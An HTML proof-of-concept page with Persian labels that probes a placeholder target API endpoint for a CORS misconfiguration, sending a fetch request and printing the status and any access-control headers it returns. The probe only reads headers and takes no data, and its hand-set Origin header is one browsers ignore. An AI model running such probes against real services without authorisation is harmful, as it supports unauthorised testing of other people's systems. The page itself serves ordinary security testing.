<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - با Origin</title>
</head>
<body>
    <h1>✅ اثبات آسیب‌پذیری CORS</h1>
    <button onclick="testWithOrigin()" style="padding:10px 20px;font-size:16px;">کلیک کن تا با Origin تست کنه</button>
    <pre id="result" style="background:#f4f4f4;padding:15px;margin-top:20px;border-radius:5px;white-space:pre-wrap;"></pre>

    <script>
    function testWithOrigin() {
        const url = "https://mytarget.com/api/usage-logging/v1/log/hublytics-multi/no-auth";
        const myOrigin = window.location.origin; // این Origin خودت رو می‌گیره
        
        document.getElementById('result').innerHTML = '🔄 ارسال درخواست با Origin: ' + myOrigin + '\n\n';
        
        // درخواست GET با Origin
        fetch(url, {
            method: "GET",
            headers: {
                "Origin": myOrigin
            }
        })
        .then(response => {
            let output = '✅ درخواست GET با Origin ارسال شد!\n';
            output += '📌 Status: ' + response.status + '\n';
            
            // گرفتن همه هدرها
            const headers = response.headers;
            let corsHeaders = '';
            let hasCORS = false;
            
            headers.forEach((value, key) => {
                if (key.toLowerCase().includes('access-control') || 
                    key.toLowerCase().includes('origin') ||
                    key.toLowerCase().includes('cors')) {
                    corsHeaders += '   ' + key + ': ' + value + '\n';
                    hasCORS = true;
                }
            });
            
            if (hasCORS) {
                output += '✅ هدرهای CORS پیدا شد:\n' + corsHeaders;
            } else {
                output += '❌ هیچ هدر CORSای پیدا نشد!\n';
                output += '📋 همه هدرهای موجود:\n';
                headers.forEach((value, key) => {
                    output += '   ' + key + ': ' + value + '\n';
                });
            }
            
            document.getElementById('result').innerHTML = output;
        })
        .catch(err => {
            document.getElementById('result').innerHTML = '❌ خطا: ' + err;
        });
    }
    </script>
</body>
</html>
